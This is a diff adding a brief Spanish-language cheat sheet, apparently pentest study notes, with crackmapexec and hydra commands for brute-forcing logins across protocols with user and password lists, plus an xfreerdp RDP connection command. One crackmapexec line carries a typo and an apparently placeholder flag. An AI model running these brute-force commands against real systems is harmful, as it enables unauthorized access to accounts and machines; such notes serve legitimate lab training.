@@ -1,0 +1,13 @@
+##Crackear varios protocolos
+
+crackmapexec protocolo target_ip -u user.list -p password.list
+#Usar lista de usuarios y lista de contraseñas para intentar loguearse en el protocolo que crackmapexec admite
+crackmapexec smb target_ip -u user.list -p password.listo --carpetacompartida
+#Con smb cambia un poco
+
+hydra -L user.list -P password.list protocolo://10.129.42.197
+#Lo mismo que crackmapexec pero con hydra
+
+#Conectarse a RDP
+xfreerdp /v:<target-IP> /u:<username> /p:<password>
+
